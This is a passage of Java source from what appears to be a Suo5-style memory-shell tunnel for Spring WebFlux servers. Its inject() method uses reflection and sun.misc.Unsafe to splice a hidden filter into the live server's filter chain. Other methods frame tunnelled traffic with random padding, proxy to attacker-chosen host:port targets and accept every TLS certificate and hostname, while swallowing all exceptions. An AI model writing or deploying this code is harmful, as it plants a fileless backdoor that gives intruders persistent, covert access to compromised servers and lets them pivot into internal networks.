        m.put(T_ID, id.getBytes(UTF8));
        return m;
    }

    private static HashMap<String, byte[]> newStatus(String id, byte s) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{AC_STATUS});
        m.put("s", new byte[]{s});
        m.put(T_ID, id.getBytes(UTF8));
        return m;
    }

    private static HashMap<String, byte[]> newHeartbeat(String id) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{AC_HEARTBEAT});
        m.put(T_ID, id.getBytes(UTF8));
        return m;
    }

    private static HashMap<String, byte[]> newDirtyChunk(int size) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{AC_DIRTY});
        if (size > 0) {
            byte[] d = new byte[size];
            new Random().nextBytes(d);
            m.put("d", d);
        }
        return m;
    }


    @SuppressWarnings("unchecked")
    private static void emitData(HashMap<String, Object> t, byte[] bytes) {
        emit((Sinks.Many<byte[]>) t.get(T_SINK), t.get(T_LOCK),
                marshalBase64(newData((String) t.get(T_ID), bytes)), (Integer) t.get(T_DIRTY));
    }

    private static void tunnelClosed(HashMap<String, Object> t) {
        AtomicBoolean closed = (AtomicBoolean) t.get(T_CLOSED);
        if (closed == null || !closed.compareAndSet(false, true)) {
            return;
        }
        String id = (String) t.get(T_ID);
        if (ctx.remove(id, t)) {
            @SuppressWarnings("unchecked")
            Sinks.Many<byte[]> many = (Sinks.Many<byte[]>) t.get(T_SINK);
            emit(many, t.get(T_LOCK), (byte[]) t.get(T_END), t.get(T_DIRTY) == null ? 0 : (Integer) t.get(T_DIRTY));
            many.tryEmitComplete();
        }
        disposeTunnel(t);
    }

    private static void disposeTunnel(HashMap<String, Object> t) {
        Connection conn = (Connection) t.get(T_CONN);
        if (conn != null && !conn.isDisposed()) {
            conn.dispose();
        }
    }

    private static void emit(Sinks.Many<byte[]> many, Object lock, byte[] data) {
        emit(many, lock, data, 0);
    }

    private static void emit(Sinks.Many<byte[]> many, Object lock, byte[] data, int dirty) {
        if (many == null || data == null || data.length == 0) {
            return;
        }
        synchronized (lock) {
            many.tryEmitNext(data);
            if (dirty > 0) {
                many.tryEmitNext(marshalBase64(newDirtyChunk(dirty)));
            }
        }
    }

    private static void write(ByteArrayOutputStream out, byte[] b) {
        if (b != null && b.length > 0) {
            out.write(b, 0, b.length);
        }
    }

    private Mono<Void> writeBytes(ServerHttpResponse response, byte[] body) {
        response.getHeaders().setContentLength(body.length);
        if (body.length == 0) {
            return response.setComplete();
        }
        return response.writeWith(Mono.just(response.bufferFactory().wrap(body)));
    }

    private static void setBypassHeader(ServerHttpResponse response) {
        response.getHeaders().set("X-Accel-Buffering", "no");
    }

    private static byte[] templateStart(ServerHttpResponse response, String sid) {
        Object o = ctx.get(sid);
        if (!(o instanceof String[])) {
            return new byte[0];
        }
        String[] parts = (String[]) o;
        if (parts.length != 3) {
            return new byte[0];
        }
        response.getHeaders().set("Content-Type", parts[0]);
        return parts[1].getBytes(UTF8);
    }

    private static byte[] templateEnd(String sid) {
        Object o = ctx.get(sid);
        if (!(o instanceof String[])) {
            return new byte[0];
        }
        String[] parts = (String[]) o;
        if (parts.length != 3) {
            return new byte[0];
        }
        return parts[2].getBytes(UTF8);
    }

    private static int dirtySize(String sid) {
        Object o = ctx.get(sid + "_jk");
        if (o instanceof Integer) {
            return (Integer) o;
        }
        return 0;
    }

    private static InetSocketAddress targetAddress(ServerHttpRequest request, HashMap<String, byte[]> m) {
        String host = new String(m.get("h"), UTF8);
        int port = Integer.parseInt(new String(m.get("p"), UTF8));
        if (port == 0) {
            InetSocketAddress local = request.getLocalAddress();
            if (local != null) {
                host = local.getHostString();
                port = local.getPort();
            }
        }
        return InetSocketAddress.createUnresolved(host, port);
    }

    private static String randomString(int n) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) {
            sb.append(SID_CHARS[random.nextInt(SID_CHARS.length)]);
        }
        return sb.toString();
    }

    private static HashMap<String, Boolean> collectAddr() {
        HashMap<String, Boolean> addrs = new HashMap<String, Boolean>();
        try {
            Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
            while (nifs.hasMoreElements()) {
                NetworkInterface nif = nifs.nextElement();
                Enumeration<InetAddress> addresses = nif.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    String s = addresses.nextElement().getHostAddress();
                    if (s == null) {
                        continue;
                    }
                    int idx = s.indexOf('%');
                    if (idx != -1) {
                        s = s.substring(0, idx);
                    }
                    addrs.put(s, Boolean.TRUE);
                }
            }
        } catch (Throwable ignore) {
        }
        return addrs;
    }

    private static boolean isLocalAddr(String url) {
        try {
            return localAddrs.containsKey(new URL(url).getHost());
        } catch (Throwable e) {
            return false;
        }
    }


    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }


    public static void inject() {
        try {
            Method getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke((Object) null);
            int n = Array.getLength(threads);
            for (int i = 0; i < n; i++) {
                Object thread = Array.get(threads, i);
                if (thread == null || !thread.getClass().getName().contains("NettyWebServer")) {
                    continue;
                }
                Object webServer = getFieldValue(thread, "this$0");
                Object adapter = getFieldValue(webServer, "handler");
                Object delayed = getFieldValue(adapter, "httpHandler");
                Object webHandlerAdapter = getFieldValue(delayed, "delegate");
                Object exceptionHandler = getFieldValue(webHandlerAdapter, "delegate");
                Object filteringHandler = getFieldValue(exceptionHandler, "delegate");

                Field chainField = filteringHandler.getClass().getDeclaredField("chain");
                chainField.setAccessible(true);
                Object chain = chainField.get(filteringHandler);

                List<WebFilter> filters = new ArrayList<WebFilter>();
                Object existing = getFieldValue(chain, "allFilters");
                if (existing instanceof List) {
                    for (Object o : (List<?>) existing) {
                        filters.add((WebFilter) o);
                    }
                }
                for (WebFilter f : filters) {
                    if (f instanceof Suo5WebFluxFilter) {
                        return;
                    }
                }
                filters.add(0, new Suo5WebFluxFilter());

                Object handler = getFieldValue(chain, "handler");
                Object newChain = new org.springframework.web.server.handler.DefaultWebFilterChain(
                        (org.springframework.web.server.WebHandler) handler, filters);
                setFinalField(filteringHandler, chainField, newChain);
            }
        } catch (Throwable ignore) {
        }
    }

    private static void setFinalField(Object target, Field field, Object value) throws Exception {
        try {
            field.setAccessible(true);
            field.set(target, value);
            return;
        } catch (IllegalAccessException ignore) {
        }
        Object unsafe = null;
        try {
            Class<?> uc = Class.forName("sun.misc.Unsafe");
            Field theUnsafe = uc.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            unsafe = theUnsafe.get(null);
        } catch (Throwable ignore) {
        }
        if (unsafe == null) {
            throw new IllegalAccessException("cannot set final field " + field.getName());
        }
        Class<?> uc = unsafe.getClass();
        Method offset = uc.getMethod("objectFieldOffset", Field.class);
        long off = (Long) offset.invoke(unsafe, field);
        Method put = uc.getMethod("putObject", Object.class, long.class, Object.class);
        put.invoke(unsafe, target, off, value);
    }

    private static Object getFieldValue(Object obj, String name) throws Exception {
        for (Class<?> c = obj.getClass(); c != null && c != Object.class; c = c.getSuperclass()) {
            try {
                Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                return f.get(obj);
            } catch (NoSuchFieldException ignore) {
            }
        }
        return null;
    }
}
